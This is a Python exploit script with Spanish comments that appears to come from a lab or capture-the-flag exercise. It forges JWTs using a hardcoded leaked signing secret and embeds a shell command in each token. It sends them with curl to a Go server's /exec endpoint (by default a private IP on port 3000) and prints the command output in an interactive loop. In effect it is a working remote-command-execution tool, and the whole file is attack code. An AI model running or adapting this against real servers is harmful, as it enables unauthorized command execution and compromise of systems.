import jwt
import datetime
import subprocess
import sys
import requests
import argparse

def generate_token(command, url, port, secret):
    # Utiliza el secreto proporcionado o el valor predeterminado
    secret_key = secret if secret else "PSmu3dR2wMZQvNge"

    # Crea un token con la estructura "/exec/{cmd}"
    token_payload = {
        "cmd": command,
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # Establecer tiempo de expiración (opcional)
    }

    # Codifica el token usando el secreto
    token = jwt.encode(token_payload, secret_key, algorithm='HS256')

    # Construye la URL con el token JWT
    if url and port:
        url_with_token = f"http://{url}:{port}/exec/{token}"
    else:
        url_with_token = f"http://172.16.1.22:3000/exec/{token}"

    print("URL con el token JWT:", url_with_token)

    # Usa cURL directamente con el token en el encabezado "Authorization"
    try:
        # Captura solo la salida del comando, sin la información del proceso
        response = subprocess.check_output(["curl", "-s", "-H", f"Authorization: Bearer {token}", url_with_token], text=True)
        print("Respuesta del servidor:")
        print(response)
    except subprocess.CalledProcessError as e:
        print(f"Error en la solicitud: {e}")

if __name__ == "__main__":
    # Configura el parser de argumentos
    parser = argparse.ArgumentParser(description="Generador de token y ejecución de comandos en servidor Go.")
    parser.add_argument("command", help="Comando a ejecutar")
    parser.add_argument("--url", help="URL del servidor Go")
    parser.add_argument("--port", help="Puerto del servidor Go")
    parser.add_argument("--secret", help="Clave secreta para firmar el token (opcional)")

    # Parsea los argumentos de la línea de comandos
    args = parser.parse_args()

    # Mensaje de ayuda para explicar el propósito y el uso del script
    print("Este script genera un token JWT con un comando y lo envía a un servidor Go para su ejecución.")
    print("Puedes proporcionar un comando directamente o ingresar 'exit' para salir.")
    print("Ejemplo: python script.py --url 192.168.1.100 --port 8080 --secret MySecretKey ls -la")

    # Bucle para ingresar comandos hasta que se ingrese 'exit'
    while True:
        user_input = input("Ingresa un comando: ")

        if user_input.lower() == 'exit':
            break

        # Utiliza la URL, el puerto y el secreto proporcionados como argumentos, si están presentes
        generate_token(user_input, args.url, args.port, args.secret)

